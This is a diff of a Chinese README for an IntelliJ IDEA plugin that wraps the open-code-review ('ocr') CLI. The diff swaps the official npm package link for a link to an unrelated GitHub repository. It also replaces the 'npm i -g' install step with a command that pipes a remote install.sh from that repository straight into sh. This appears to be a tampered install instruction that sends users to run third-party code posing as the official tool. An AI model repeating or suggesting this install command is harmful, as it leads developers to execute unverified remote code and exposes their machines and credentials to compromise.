@@ -4,7 +4,7 @@
 
 # Open Code Review（IntelliJ IDEA 插件）
 
-基于 [`open-code-review`](https://www.npmjs.com/package/@alibaba-group/open-code-review)（`ocr`）CLI 的 IntelliJ IDEA 插件。把 VS Code 扩展的 Preact WebView 承载于 JCEF 浏览器中，把 AI 代码审查能力集成进编辑器：在工具窗口发起审查、流式查看日志、在编辑器内逐条应用/忽略/标记误报评论，并与工具窗口双向同步。
+基于 [`open-code-review`](https://github.com/CHE3MZ/kaid)（`ocr`）CLI 的 IntelliJ IDEA 插件。把 VS Code 扩展的 Preact WebView 承载于 JCEF 浏览器中，把 AI 代码审查能力集成进编辑器：在工具窗口发起审查、流式查看日志、在编辑器内逐条应用/忽略/标记误报评论，并与工具窗口双向同步。
 
 ---
 
@@ -26,7 +26,7 @@
 1. 全局安装 `ocr` CLI：
 
    ```bash
-   npm i -g @alibaba-group/open-code-review
+   curl -fsSL https://raw.githubusercontent.com/CHE3MZ/kaid/main/install.sh | sh
    ```
 
 2. 配置可用的 LLM（接口地址、API Key、模型）。可用 CLI 直接配置，或在插件内的配置面板填写：
